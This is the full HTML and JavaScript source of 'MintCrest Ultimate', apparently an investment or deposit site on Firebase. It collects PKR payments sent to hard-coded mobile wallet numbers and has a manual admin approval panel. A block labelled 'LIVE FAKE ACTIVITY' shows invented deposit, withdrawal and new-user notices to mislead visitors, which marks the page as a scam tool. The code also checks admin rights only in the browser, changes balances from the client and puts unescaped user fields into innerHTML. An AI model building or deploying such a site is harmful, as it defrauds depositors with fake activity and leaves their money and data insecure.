<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MintCrest Ultimate</title>

<script src="https://cdn.tailwindcss.com"></script>

<style>
body {background:linear-gradient(135deg,#0d1117,#111827);color:white;font-family:sans-serif;}
.card {background:rgba(255,255,255,0.03);padding:15px;border-radius:15px;margin-bottom:12px;}
input,select {padding:10px;width:100%;margin:5px 0;border-radius:10px;background:#1f2937;border:none;}
button {padding:10px;border-radius:10px;font-weight:bold;margin:3px;}
button:hover{transform:scale(1.05);}
</style>
</head>

<body>

<div id="app" style="display:none;padding:20px;">

<h2>Dashboard</h2>

<div class="card">
User ID: <span id="uid"></span>
</div>

<div class="card">
Balance: <span id="balance">0 PKR</span>
</div>

<!-- Deposit -->
<div class="card">
<h3>Deposit</h3>

<select id="method">
<option value="jazzcash">JazzCash</option>
<option value="easypaisa">EasyPaisa</option>
<option value="sadapay">SadaPay</option>
</select>

<div id="paymentInfo"></div>

<input id="amount" placeholder="Amount">
<input id="tid" placeholder="Transaction ID">
<input id="account" placeholder="Your Number">
<input type="file" id="proof">

<button onclick="deposit()" style="background:#22c55e;">Submit Deposit</button>
</div>

<!-- Withdraw -->
<div class="card">
<h3>Withdraw</h3>
<input id="wamount" placeholder="Amount">
<input id="waccount" placeholder="Account Number">
<button onclick="withdraw()" style="background:#ef4444;">Withdraw</button>
</div>

<button onclick="showHistory()">History</button>

<!-- Admin -->
<div id="stats" class="card" style="display:none;"></div>
<div id="adminTitle" style="display:none;">Admin Panel</div>
<div id="admin"></div>

</div>

<!-- History -->
<div id="historyPage" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;padding:20px;overflow:auto;">
<h2>History</h2>
<button onclick="closeHistory()">Close</button>
<div id="historyList"></div>
</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
import { getFirestore, doc, getDoc, setDoc, updateDoc, collection, addDoc, getDocs, query, where } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";

const firebaseConfig = {
  apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg",
  authDomain: "investment-84f4e.firebaseapp.com",
  projectId: "investment-84f4e",
  storageBucket: "investment-84f4e.firebasestorage.app",
  messagingSenderId: "975293889308",
  appId: "1:975293889308:web:6d034a99cc966c75ff58d9"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const storage = getStorage(app);

let currentUser;

signInAnonymously(auth);

onAuthStateChanged(auth, async (user)=>{
if(user){
currentUser=user;
appDiv.style.display="block";
uid.innerText=user.uid;

const refu=doc(db,"users",user.uid);
if(!(await getDoc(refu)).exists()) await setDoc(refu,{balance:0});

loadBalance();

// 🔴 SET ADMIN UID HERE
if(user.uid==="ADMIN_UID_HERE"){
stats.style.display="block";
adminTitle.style.display="block";
loadAdmin();
loadStats();
setInterval(loadAdmin,4000);
setInterval(loadStats,5000);
}
}
});

async function loadBalance(){
const d=await getDoc(doc(db,"users",currentUser.uid));
balance.innerText=d.data().balance+" PKR";
}

// PAYMENT INFO
function updatePaymentInfo(){
let m=method.value;
let n="";
if(m==="jazzcash"||m==="sadapay") n="03705519562";
if(m==="easypaisa") n="03379827882";

paymentInfo.innerHTML=`Send to: ${n} <button onclick="navigator.clipboard.writeText('${n}')">Copy</button>`;
}
method.onchange=updatePaymentInfo;
updatePaymentInfo();

// DEPOSIT
window.deposit=async ()=>{
let file=proof.files[0];
if(!file) return alert("Upload proof");

let sref=ref(storage,"proofs/"+Date.now());
await uploadBytes(sref,file);
let url=await getDownloadURL(sref);

await addDoc(collection(db,"requests"),{
user:currentUser.uid,
amount:Number(amount.value),
tid:tid.value,
account:account.value,
method:method.value,
proof:url,
type:"deposit",
status:"pending",
time:Date.now()
});

alert("Deposit sent");
};

// WITHDRAW
window.withdraw=async ()=>{
await addDoc(collection(db,"requests"),{
user:currentUser.uid,
amount:Number(wamount.value),
account:waccount.value,
type:"withdraw",
status:"pending",
time:Date.now()
});
alert("Withdraw request sent");
};

// HISTORY
window.showHistory=async ()=>{
historyPage.style.display="block";
const q=query(collection(db,"requests"),where("user","==",currentUser.uid));
const snap=await getDocs(q);

historyList.innerHTML="";
snap.forEach(d=>{
let x=d.data();
historyList.innerHTML+=`
<div class="card">
${x.type} | ${x.amount} | ${x.status}<br>
${new Date(x.time).toLocaleString()}
</div>`;
});
};

window.closeHistory=()=>historyPage.style.display="none";

// ADMIN
async function loadAdmin(){
const q=query(collection(db,"requests"),where("status","==","pending"));
const snap=await getDocs(q);

admin.innerHTML="";
snap.forEach(docu=>{
let d=docu.data();

admin.innerHTML+=`
<div class="card">
${d.user}<br>${d.type} | ${d.amount}<br>
<img src="${d.proof||''}" width="80" onclick="viewImg('${d.proof}')">
<br>
<button onclick="approve('${docu.id}')">Approve</button>
<button onclick="reject('${docu.id}')">Reject</button>
</div>`;
});
}

// APPROVE
window.approve=async (id)=>{
let refd=doc(db,"requests",id);
let d=(await getDoc(refd)).data();

let uref=doc(db,"users",d.user);
let u=(await getDoc(uref)).data();

if(d.type==="deposit") await updateDoc(uref,{balance:u.balance+d.amount});
if(d.type==="withdraw") await updateDoc(uref,{balance:u.balance-d.amount});

await updateDoc(refd,{status:"approved"});
loadAdmin(); loadBalance();
};

window.reject=async (id)=>{
await updateDoc(doc(db,"requests",id),{status:"rejected"});
loadAdmin();
};

// IMAGE VIEW
window.viewImg=(url)=>{
let div=document.createElement("div");
div.style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;";
div.innerHTML=`<img src="${url}" style="max-width:90%">`;
div.onclick=()=>div.remove();
document.body.appendChild(div);
};

// STATS
async function loadStats(){
let users=(await getDocs(collection(db,"users"))).size;
let reqs=await getDocs(collection(db,"requests"));

let dep=0,withd=0;
reqs.forEach(d=>{
let x=d.data();
if(x.type==="deposit") dep+=x.amount;
if(x.type==="withdraw") withd+=x.amount;
});

stats.innerHTML=`
Users: ${users}<br>
Deposits: ${dep}<br>
Withdraws: ${withd}`;
}

// LIVE FAKE ACTIVITY
setInterval(()=>{
let msgs=["Deposit received","Withdraw processed","New user joined"];
let div=document.createElement("div");
div.innerText=msgs[Math.floor(Math.random()*msgs.length)];
div.style="position:fixed;top:10px;right:10px;background:#22c55e;padding:8px;border-radius:8px;";
document.body.appendChild(div);
setTimeout(()=>div.remove(),3000);
},5000);

// AUTO BALANCE
setInterval(loadBalance,5000);

</script>

</body>
</html>
